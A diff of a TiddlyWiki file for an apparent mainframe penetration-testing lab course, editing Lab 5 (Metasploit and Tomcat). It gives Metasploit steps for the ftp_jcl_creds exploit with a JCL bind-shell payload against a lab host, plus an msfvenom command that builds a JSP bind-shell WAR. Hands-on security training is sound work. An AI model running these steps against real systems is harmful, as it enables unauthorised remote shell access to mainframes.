@@ -8742,7 +8742,7 @@ Error message and password prompt
 <div created="20181014055436789" modified="20181113215803257" title="$:/state/tab/sidebar--1835078512">
 <pre>$:/core/ui/SideBar/Open</pre>
 </div>
-<div created="20190515031012623" list="$:/ControlPanel [[Lab 1 - Enumeration]] [[Lab 2 - Headless Interaction]] [[Lab 3 - CICSpwn and CICS fun]] [[Lab 4 - FTP Code Execution]] [[Lab 5 - Metasploit &amp; Tomcat]] [[Lab 6 - z/OS Enumeration]] [[Lab 7 - NJE Privesc]]" modified="20190515040411382" title="$:/StoryList">
+<div list="[[Lab 1 - Enumeration]] [[Lab 2 - Headless Interaction]] [[Lab 3 - CICSpwn and CICS fun]] [[Lab 4 - FTP Code Execution]] [[Lab 5 - Metasploit &amp; Tomcat]] [[Lab 6 - z/OS Enumeration]] [[Lab 7 - NJE Privesc]]" title="$:/StoryList">
 <pre></pre>
 </div>
 <div plugin-type="info" title="$:/temp/info-plugin" type="application/json">
@@ -9257,7 +9257,7 @@ msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f wa
 * Which user are you running commands as?
 * What ''attributes'' does this account have?</pre>
 </div>
-<div created="20181014044107306" modified="20190515034231497" tags="" title="Lab 5 - Metasploit &amp; Tomcat">
+<div created="20181014044107306" modified="20190515111717719" tags="" title="Lab 5 - Metasploit &amp; Tomcat">
 <pre>!!''Lab Objectives''
 # Use metasploit natively to obtain a reverse USS shell
 
@@ -9271,7 +9271,7 @@ msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f wa
 
 !!''Using Metasploit to Connect/Execute''
 * The  metasploit exploit `ftp_jcl_creds` uses the command `SITE FILE=JES` to run HLASM
-* The payload `bind_shell_jcl` is a reverse Unix shell written in JCL and HLASM
+* The payload `bind_shell_jcl` is a bind Unix shell written in JCL and HLASM
 * ''RHOSTS'' is the target FTP server
 * ''LPORT'' tells metasploit which port to connect back to
 
@@ -9283,6 +9283,7 @@ msfvenom -p java/jsp_shell_bind_tcp LPORT=&lt;port between 20000-30000&gt; -f wa
 * Change the FTP User and password: `set FTPUSER &lt;user&gt;` . and `set FTPPASS &lt;password&gt;`
 * Set ''RHOST'' to evilmf: `set rhost evilmf.evilmainframe.com`
 * Set ''LPORT'' to a port between 20000 and 40000: `set lport &lt;port&gt;` e.g `set lport 22222`
+* Enable Passive mode: `set PassiveMode true`
 * Type `exploit` to launch the exploit and get a reverse shell
 
 ---
